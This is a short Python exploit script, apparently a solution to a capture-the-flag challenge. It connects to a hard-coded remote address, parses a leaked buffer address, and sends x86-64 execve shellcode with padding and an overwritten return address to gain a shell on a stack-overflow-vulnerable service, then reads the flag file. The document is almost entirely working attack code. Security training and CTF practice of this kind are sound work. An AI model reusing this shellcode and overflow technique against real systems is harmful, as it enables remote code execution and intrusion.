# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

import socket
import readline

host = '127.0.0.1'
port = 9000
host = '120.114.62.211'
port = 2119

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

def recv(info=None):
  # TODO
  res = s.recv(4096)
  print(f'[<] {info if info else ""}')
  print(res.decode('ascii'))
  return res

def send(data):
  # TODO
  data = data + b'\n' if data[-1] != b'\n' else data
  s.send(data)

def interact():
  for _ in range(100):
    cmd = input('> ').encode('ascii')
    send(cmd)
    recv(4096)

res = recv('Buf address').decode('ascii')
buf_adr = int(res[res.find('is ')+3:res.find('\n')], 16)
print(f'[+] Buf address: {hex(buf_adr)}')

# read    = (0x4005f6).to_bytes(8, 'little')
padding_len = 0x78

shellcode   = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
padding     = b'A'*(padding_len-len(shellcode))

payload  = b''
payload += shellcode
payload += padding
payload += (buf_adr).to_bytes(8, 'little')
send(payload)
# interact()

get_flag = b'cat flag'
send(get_flag)
recv('Flag')
